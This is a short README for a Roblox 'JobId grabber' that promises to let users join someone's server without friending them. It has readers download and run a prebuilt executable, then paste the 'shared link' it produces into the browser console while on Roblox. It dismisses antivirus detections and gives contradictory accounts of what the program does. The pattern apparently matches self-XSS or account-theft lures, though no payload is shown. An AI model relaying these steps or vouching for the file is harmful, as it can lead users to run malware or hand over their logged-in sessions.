## What is this?
- To join the same server or shared server with someone without friending them.

## Usage
1. Download the file by clicking this link: https://github.com/mengdeveloper/rbxjobidgrabber/releases/download/Release/JobIdGetter.exe
2. Open the file `JobIdGetter.exe`.
3. Copy the shared link.
4. Open chrome or firefox Console. (F12 or Ctrl-Shift-I)
5. Paste the shared link in console and load Roblox.

## Issue
I haven't fix when you join game by the launcher it only work with Roblox from website.

## Anti Cheat
- **This application is completely harmless for `Roblox` because it has no injection or anything to touch into `Roblox` this is just keeping mouse position on the same place.**

## Note
- Please open everytime you need to grab JobId/Current Server Id

## FAQ
1. **Why is anti virus detecting it?**
- it doesn't detect in my computer by false positive (the application is just go on roblox file and grab jobid from log).
